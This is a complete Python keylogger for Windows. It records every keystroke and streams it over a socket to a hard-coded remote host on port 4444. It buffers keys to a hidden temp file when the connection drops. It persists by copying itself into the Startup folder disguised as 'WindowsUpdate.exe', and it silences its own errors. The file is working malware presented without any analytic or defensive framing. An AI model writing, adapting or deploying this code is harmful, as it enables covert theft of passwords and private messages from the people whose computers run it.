from pynput import keyboard
import socket
import time
import os
import shutil
import sys

IP = "10.10.10.5"
PORT = 4444

caps = False
buff = []
log_file = os.path.join(os.getenv('TEMP'), 'winlog.txt')

def persist():
    try:
        if getattr(sys, 'frozen', False):
            exe_actual = sys.executable
        else:
            return
        
        startup_dir = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
        )
        
        destino = os.path.join(startup_dir, 'WindowsUpdate.exe')
        
        if not os.path.exists(destino):
            os.makedirs(startup_dir, exist_ok=True)
            shutil.copy2(exe_actual, destino)
            
    except:
        pass

persist()

def conn():
    while True:
        try:
            s = socket.socket()
            s.settimeout(10)
            s.connect((IP, PORT))
            s.settimeout(None)
            return s
        except:
            time.sleep(5)

def load():
    global buff
    try:
        if os.path.exists(log_file):
            with open(log_file, 'r', encoding='utf-8') as f:
                contenido = f.read()
                if contenido:
                    buff = list(contenido)
            os.remove(log_file)
    except:
        pass

def save(k):
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(k)
    except:
        pass

sock = None
intentos = 0

while sock is None and intentos < 3:
    try:
        sock = conn()
        load()
        if buff:
            try:
                sock.send(''.join(buff).encode('utf-8', errors='ignore'))
                buff = []
            except:
                pass
        break
    except:
        intentos += 1
        time.sleep(2)

def send(k):
    global sock
    
    if sock:
        try:
            sock.send(k.encode('utf-8', errors='ignore'))
        except:
            sock = None
            save(k)
            try:
                sock = conn()
                load()
                if buff:
                    sock.send(''.join(buff).encode('utf-8', errors='ignore'))
                    buff = []
                sock.send(k.encode('utf-8', errors='ignore'))
            except:
                sock = None
    else:
        save(k)

def on_press(key):
    global caps
    
    if key == keyboard.Key.caps_lock:
        caps = not caps
        return
    
    k = None
    
    if hasattr(key, 'char') and key.char:
        k = key.char
        if k.isalpha():
            k = k.upper() if caps else k.lower()
    else:
        if key == keyboard.Key.space:
            k = ' '
        elif key == keyboard.Key.enter:
            k = '\n'
        elif key == keyboard.Key.tab:
            k = '\t'
        elif key == keyboard.Key.backspace:
            k = '\b'
    
    if k:
        send(k)

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()